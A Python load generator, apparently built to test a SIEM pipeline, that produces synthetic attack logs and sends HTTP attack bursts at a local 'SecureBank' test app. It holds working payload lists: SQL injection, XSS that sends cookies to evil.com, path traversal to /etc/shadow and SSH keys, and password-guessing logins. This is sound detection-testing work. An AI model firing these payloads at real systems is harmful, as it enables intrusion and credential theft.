#!/usr/bin/env python3
"""
CLIF — High-Volume Attack & Telemetry Event Generator
=====================================================================================
Generates high-volume synthetic attack event streams directly to Vector (TCP NDJSON)
or via the SecureBank HTTP API, targeting the full SIEM pipeline (Triage -> Hunter -> Verifier).

Supported Modes:
  1. direct  — High-throughput raw & security logs streamed directly to Vector (:9514)
  2. http    — Multi-threaded HTTP attacks against SecureBank web endpoints (:5001)

Usage:
    python load_attack_generator.py --mode direct --count 50000 --workers 8
    python load_attack_generator.py --mode http --target http://localhost:5001 --burst 1000
    python load_attack_generator.py --mode direct --attack-type mixed --count 20000
"""

import argparse
import json
import os
import random
import socket
import sys
import threading
import time
import uuid
from datetime import datetime, timezone
from typing import List, Dict, Any

try:
    import requests
except ImportError:
    requests = None

# ANSI styling
class C:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"


# ── Payload Templates & Indicators for SIEM Detection ───────────────────────

SQLI_PROBES = [
    "' OR 1=1 --",
    "'; DROP TABLE users; --",
    "admin' --",
    "' UNION SELECT username,password FROM users --",
    "1; SELECT * FROM information_schema.tables --",
    "' OR ''='",
    "'; INSERT INTO users VALUES('hacker','pwned'); --",
    "1' AND (SELECT COUNT(*) FROM users) > 0 --",
    "1 UNION ALL SELECT NULL,NULL,NULL--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1' ORDER BY 10--",
    "admin'/*",
    "1 UNION SELECT load_file('/etc/passwd')--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
]

XSS_PROBES = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(document.cookie)>',
    '<svg onload=alert("hacked")>',
    'javascript:alert(1)',
    '<iframe src="javascript:alert(1)">',
    '"><script>document.location="http://evil.com/?c="+document.cookie</script>',
    '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
    '<svg/onload=fetch("http://evil.com/?c="+document.cookie)>',
    '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
]

TRAVERSAL_PROBES = [
    "../../etc/passwd",
    "../../../etc/shadow",
    "..%2f..%2f..%2fetc/passwd",
    "....//....//etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "../../proc/self/environ",
    "../../var/log/auth.log",
    "../../../root/.ssh/id_rsa",
    "..%c0%af..%c0%afetc/passwd",
]

RECON_URLS = [
    "/admin", "/wp-admin", "/phpmyadmin", "/.env", "/config",
    "/api/v1", "/api/v2", "/debug", "/status", "/backup",
    "/.git/config", "/robots.txt", "/server-status", "/console",
    "/api/users", "/api/transactions", "/api/export", "/actuator/env",
]

USER_TARGETS = [
    "admin", "root", "sysadmin", "john.doe", "jane.smith",
    "mike.ops", "administrator", "guest", "dbadmin", "operator"
]

TARGET_HOSTS = [
    "srv-prod-auth01", "srv-prod-db01", "srv-web-frontend",
    "ws-finance-09", "ws-ops-04", "securebank-web01", "dc-root-01"
]


# ── Synthetic Event Builders ────────────────────────────────────────────────

def generate_security_event(attack_type: str, ip: str, hostname: str, user: str) -> Dict[str, Any]:
    """Build a structured security event that triggers AI Triage scoring rules."""
    now = datetime.now(timezone.utc).isoformat()
    req_id = str(uuid.uuid4())[:8]

    if attack_type == "brute_force":
        return {
            "timestamp": now,
            "clif_event_type": "security",
            "source": "securebank",
            "hostname": hostname,
            "ip_address": ip,
            "user_id": user,
            "category": "auth",
            "severity": 4,
            "level": "ERROR",
            "log_type": "syslog",
            "status": "failure",
            "auth_type": "password",
            "username": user,
            "message": f"Brute force detected: multiple failed login attempts from ip={ip} for user='{user}' — failed password — break-in attempt",
            "mitre_tactic": "credential-access",
            "mitre_technique": "T1110",
            "request_id": req_id,
        }

    elif attack_type == "sqli":
        payload = random.choice(SQLI_PROBES)
        return {
            "timestamp": now,
            "clif_event_type": "security",
            "source": "securebank",
            "hostname": hostname,
            "ip_address": ip,
            "user_id": user,
            "category": "injection",
            "severity": 4,
            "level": "ERROR",
            "log_type": "web",
            "http_method": "GET",
            "url": f"/api/search?q={payload}",
            "message": f"SQL injection attempt detected: user={user} query=\"{payload}\" — malicious input — access denied from ip={ip}",
            "mitre_tactic": "initial-access",
            "mitre_technique": "T1190",
            "request_id": req_id,
        }

    elif attack_type == "xss":
        payload = random.choice(XSS_PROBES)
        return {
            "timestamp": now,
            "clif_event_type": "security",
            "source": "securebank",
            "hostname": hostname,
            "ip_address": ip,
            "user_id": user,
            "category": "injection",
            "severity": 4,
            "level": "ERROR",
            "log_type": "web",
            "http_method": "POST",
            "url": "/api/profile",
            "message": f"XSS attack detected: user={user} injected script payload in profile update — cross-site scripting — malicious input from ip={ip}",
            "mitre_tactic": "initial-access",
            "mitre_technique": "T1059",
            "payload_preview": payload[:80],
            "request_id": req_id,
        }

    elif attack_type == "traversal":
        path = random.choice(TRAVERSAL_PROBES)
        return {
            "timestamp": now,
            "clif_event_type": "security",
            "source": "securebank",
            "hostname": hostname,
            "ip_address": ip,
            "user_id": user,
            "category": "injection",
            "severity": 4,
            "level": "WARNING",
            "log_type": "web",
            "http_method": "GET",
            "url": f"/api/documents/{path}",
            "message": f"Path traversal attack detected: user={user} path='{path}' — directory traversal — unauthorized file access from ip={ip}",
            "mitre_tactic": "discovery",
            "mitre_technique": "T1083",
            "request_id": req_id,
        }

    elif attack_type == "exfiltration":
        vol = random.randint(50000, 5000000)
        return {
            "timestamp": now,
            "clif_event_type": "security",
            "source": "securebank",
            "hostname": hostname,
            "ip_address": ip,
            "user_id": user,
            "category": "exfiltration",
            "severity": 4,
            "level": "CRITICAL",
            "log_type": "web",
            "http_method": "GET",
            "url": "/api/export?format=json",
            "message": f"Bulk data export triggered by user={user} — exfiltration of customer records — data leak — unusual transfer — {vol} bytes from ip={ip}",
            "mitre_tactic": "exfiltration",
            "mitre_technique": "T1041",
            "request_id": req_id,
        }

    elif attack_type == "priv_esc":
        return {
            "timestamp": now,
            "clif_event_type": "security",
            "source": "securebank",
            "hostname": hostname,
            "ip_address": ip,
            "user_id": user,
            "category": "privilege-escalation",
            "severity": 4,
            "level": "CRITICAL",
            "log_type": "syslog",
            "status": "denied",
            "auth_type": "password",
            "username": user,
            "message": f"Access denied: user '{user}' attempted unauthorized admin elevation — privilege escalation attempt — sudo rule bypass",
            "mitre_tactic": "privilege-escalation",
            "mitre_technique": "T1548",
            "request_id": req_id,
        }

    else:  # generic discovery / recon
        url = random.choice(RECON_URLS)
        return {
            "timestamp": now,
            "clif_event_type": "security",
            "source": "securebank",
            "hostname": hostname,
            "ip_address": ip,
            "user_id": user,
            "category": "discovery",
            "severity": 2,
            "level": "WARNING",
            "log_type": "web",
            "http_method": "GET",
            "url": url,
            "message": f"Recon probe: {url} from ip={ip} — port scan — directory enumeration",
            "mitre_tactic": "discovery",
            "mitre_technique": "T1046",
            "request_id": req_id,
        }


def generate_network_event(ip: str, hostname: str, is_attack: bool = False) -> Dict[str, Any]:
    """Build a network telemetry log."""
    now = datetime.now(timezone.utc).isoformat()
    sent_bytes = random.randint(50000, 2000000) if is_attack else random.randint(128, 4096)
    return {
        "timestamp": now,
        "clif_event_type": "network",
        "log_type": "netflow",
        "source": "securebank",
        "hostname": hostname,
        "src_ip": ip,
        "dst_ip": "10.0.1.50",
        "src_port": random.randint(30000, 65535),
        "dst_port": random.choice([443, 80, 8080, 8443, 22]),
        "protocol": "TCP",
        "bytes_sent": sent_bytes,
        "bytes_received": random.randint(64, 2048),
        "direction": "inbound",
        "duration_ms": random.randint(5, 500),
        "level": "WARNING" if is_attack else "INFO",
        "message": f"Inbound connection from {ip} to {hostname}:443 ({sent_bytes} bytes)",
        "request_id": str(uuid.uuid4())[:8],
    }


# ── Vector Streaming Worker ─────────────────────────────────────────────────

def vector_worker(
    worker_id: int,
    host: str,
    port: int,
    events_per_worker: int,
    attack_type: str,
    results: Dict[str, int],
    lock: threading.Lock
):
    """Worker thread streaming batches of NDJSON events over TCP socket."""
    attack_types = [
        "brute_force", "sqli", "xss", "traversal", "exfiltration", "priv_esc", "recon"
    ] if attack_type == "mixed" else [attack_type]

    sent_count = 0
    error_count = 0

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10.0)
        sock.connect((host, port))
    except Exception as e:
        with lock:
            results["errors"] += events_per_worker
        return

    buffer = []
    batch_size = 200

    for i in range(events_per_worker):
        ip = f"192.168.1.{random.randint(10, 250)}"
        host_name = random.choice(TARGET_HOSTS)
        user = random.choice(USER_TARGETS)
        a_type = random.choice(attack_types)

        if random.random() < 0.7:
            ev = generate_security_event(a_type, ip, host_name, user)
        else:
            ev = generate_network_event(ip, host_name, is_attack=True)

        buffer.append(json.dumps(ev) + "\n")

        if len(buffer) >= batch_size:
            payload = "".join(buffer).encode("utf-8")
            buffer.clear()
            try:
                sock.sendall(payload)
                sent_count += batch_size
            except Exception:
                error_count += batch_size
                try:
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10.0)
                    sock.connect((host, port))
                except Exception:
                    break

    if buffer:
        try:
            sock.sendall("".join(buffer).encode("utf-8"))
            sent_count += len(buffer)
        except Exception:
            error_count += len(buffer)

    try:
        sock.close()
    except Exception:
        pass

    with lock:
        results["sent"] += sent_count
        results["errors"] += error_count


# ── HTTP Attack Burst Worker ────────────────────────────────────────────────

def http_worker(
    worker_id: int,
    target_url: str,
    burst_count: int,
    results: Dict[str, int],
    lock: threading.Lock
):
    """Worker thread executing rapid HTTP requests against SecureBank endpoints."""
    if requests is None:
        return

    sess = requests.Session()
    ip = f"10.200.{worker_id}.{random.randint(10, 250)}"
    headers = {"X-Forwarded-For": ip}

    sent = 0
    errors = 0

    endpoints = [
        ("login", "/login", "POST"),
        ("sqli", "/api/search", "GET"),
        ("xss", "/api/profile", "POST"),
        ("traversal", "/api/documents/", "GET"),
        ("exfil", "/api/export", "GET"),
        ("recon", "/admin", "GET"),
    ]

    for _ in range(burst_count):
        ep_type, path, method = random.choice(endpoints)
        url = f"{target_url}{path}"
        try:
            if ep_type == "login":
                r = sess.post(url, data={
                    "username": random.choice(USER_TARGETS),
                    "password": f"WrongPass_{random.randint(1000, 9999)}!"
                }, headers=headers, timeout=3)
            elif ep_type == "sqli":
                r = sess.get(url, params={"q": random.choice(SQLI_PROBES)}, headers=headers, timeout=3)
            elif ep_type == "xss":
                r = sess.post(url, json={
                    "display_name": random.choice(XSS_PROBES),
                    "bio": "Attack load bio"
                }, headers=headers, timeout=3)
            elif ep_type == "traversal":
                doc_path = random.choice(TRAVERSAL_PROBES)
                r = sess.get(f"{url}{doc_path}", headers=headers, timeout=3)
            elif ep_type == "exfil":
                r = sess.get(url, params={"format": "json"}, headers=headers, timeout=3)
            else:
                r = sess.get(f"{target_url}{random.choice(RECON_URLS)}", headers=headers, timeout=3)
            sent += 1
        except Exception:
            errors += 1

    with lock:
        results["sent"] += sent
        results["errors"] += errors


# ── Main Runner ─────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="CLIF High-Volume Attack Event Generator")
    parser.add_argument("--mode", choices=["direct", "http"], default="direct",
                        help="direct: Stream NDJSON to Vector (:9514), http: Blast SecureBank Web App (:5001)")
    parser.add_argument("--vector-host", default="localhost", help="Vector host")
    parser.add_argument("--vector-port", type=int, default=9514, help="Vector TCP port (default 9514)")
    parser.add_argument("--target", default="http://localhost:5001", help="Target SecureBank URL")
    parser.add_argument("--count", type=int, default=10000, help="Total events to generate in direct mode")
    parser.add_argument("--burst", type=int, default=200, help="Total HTTP requests per worker in http mode")
    parser.add_argument("--workers", type=int, default=8, help="Number of concurrent worker threads")
    parser.add_argument("--attack-type", default="mixed",
                        choices=["mixed", "brute_force", "sqli", "xss", "traversal", "exfiltration", "priv_esc", "recon"],
                        help="Type of attack signatures to generate")

    args = parser.parse_args()

    if args.workers < 1:
        parser.error("--workers must be at least 1")
    if args.mode == "direct" and args.count < 1:
        parser.error("--count must be at least 1")
    if args.mode == "http" and args.burst < 1:
        parser.error("--burst must be at least 1")

    print(f"""
{C.CYAN}{C.BOLD}╔══════════════════════════════════════════════════════════════╗
║        CLIF — High-Volume Attack Event Generator            ║
╚══════════════════════════════════════════════════════════════╝{C.RESET}
  Mode:         {args.mode.upper()}
  Workers:      {args.workers}
  Attack Type:  {args.attack_type}
""")

    results = {"sent": 0, "errors": 0}
    lock = threading.Lock()
    threads: List[threading.Thread] = []

    start_time = time.time()

    if args.mode == "direct":
        base_count, remainder = divmod(args.count, args.workers)
        worker_counts = [base_count + (1 if i < remainder else 0) for i in range(args.workers)]
        print(f"  Target:       Vector TCP ({args.vector_host}:{args.vector_port})")
        print(f"  Total Events: {args.count:,} (~{base_count:,} per worker)")
        print(f"\n{C.YELLOW}⚡ Starting stream into Vector pipeline...{C.RESET}")

        for i in range(args.workers):
            t = threading.Thread(
                target=vector_worker,
                args=(i, args.vector_host, args.vector_port, worker_counts[i], args.attack_type, results, lock)
            )
            threads.append(t)
            t.start()

    else:
        if requests is None:
            print(f"{C.RED}Error: 'requests' library required for HTTP mode. Install: pip install requests{C.RESET}")
            sys.exit(1)

        print(f"  Target App:   {args.target}")
        print(f"  Requests:     {args.burst * args.workers:,} ({args.burst} per worker)")
        print(f"\n{C.YELLOW}🚀 Sending HTTP attack bursts to SecureBank...{C.RESET}")

        for i in range(args.workers):
            t = threading.Thread(
                target=http_worker,
                args=(i, args.target, args.burst, results, lock)
            )
            threads.append(t)
            t.start()

    # Progress monitor loop
    while any(t.is_alive() for t in threads):
        time.sleep(0.5)
        with lock:
            s = results["sent"]
            err = results["errors"]
        elapsed = time.time() - start_time
        eps = int(s / elapsed) if elapsed > 0 else 0
        print(f"\r  {C.GREEN}▶ Ingesting:{C.RESET} {s:,} events sent | {eps:,} EPS | Errors: {err} [{elapsed:.1f}s]", end="", flush=True)

    for t in threads:
        t.join()

    total_time = time.time() - start_time
    total_sent = results["sent"]
    total_errors = results["errors"]
    avg_eps = int(total_sent / total_time) if total_time > 0 else 0

    print(f"\n\n{C.BOLD}{'═'*64}{C.RESET}")
    print(f"  {C.GREEN}{C.BOLD}STREAM COMPLETE{C.RESET}")
    print(f"  Total Events Sent: {total_sent:,}")
    print(f"  Duration:          {total_time:.2f}s")
    print(f"  Throughput:        {avg_eps:,} events/sec (EPS)")
    print(f"  Errors:            {total_errors}")
    print(f"{C.BOLD}{'═'*64}{C.RESET}")
    print(f"{C.CYAN}👉 Check the CLIF Dashboard (http://localhost:3001) or Live Feed to watch agents triage and investigate!{C.RESET}\n")


if __name__ == "__main__":
    main()
